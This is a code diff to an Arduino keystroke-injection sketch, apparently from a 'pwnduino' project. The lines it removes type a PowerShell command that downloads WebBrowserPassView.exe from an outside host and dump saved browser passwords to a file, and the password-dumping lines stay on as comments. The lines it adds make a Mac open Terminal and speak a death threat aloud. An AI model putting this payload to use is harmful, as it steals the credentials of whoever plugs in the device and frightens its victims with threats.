@@ -12,9 +12,6 @@
 
 
 */
-
-
-
 #define LEFT_CTRL   0x01
 #define LEFT_SHIFT  0x02
 #define LEFT_ALT    0x04
@@ -109,39 +106,33 @@ void setup()
 
    // Open Run dialog
    delay(3000); // Wait 3 seconds
-   keyPress(LEFT_GUI, 0x15); // Windows keys + R
+   keyPress(LEFT_GUI, 0x2C); // Command keys + Space
    keyRelease(); // Release the key
    delay(200);
 
    // Run powershell.exe
-   keyString("cmd.exe"); // Enter string
+   keyString("terminal"); // Enter string
    keyPress(0, KEY_ENTER); // Press enter
    keyRelease(); // Release the key
    delay(500);
 
-/*
-   keyString("powershell");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);*/
-
-   // Run powershell command
-   keyString("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')\"");
+   // Run emoji command
+   keyString("say hello, I will find you, and I will kill you && killall Terminal");
    keyPress(0, KEY_ENTER);
    keyRelease();
    delay(500);
 
-   // Extract Passwords
-   keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);
+  //  // Extract Passwords
+  //  keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
+  //  keyPress(0, KEY_ENTER);
+  //  keyRelease();
+  //  delay(500);
 
-   // Remove WebBrowserPassViewer
-   keyString("Remove-Item WebBrowserPassView.exe");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);
+  //  // Remove WebBrowserPassViewer
+  //  keyString("Remove-Item WebBrowserPassView.exe");
+  //  keyPress(0, KEY_ENTER);
+  //  keyRelease();
+  //  delay(500);
  }
 
 
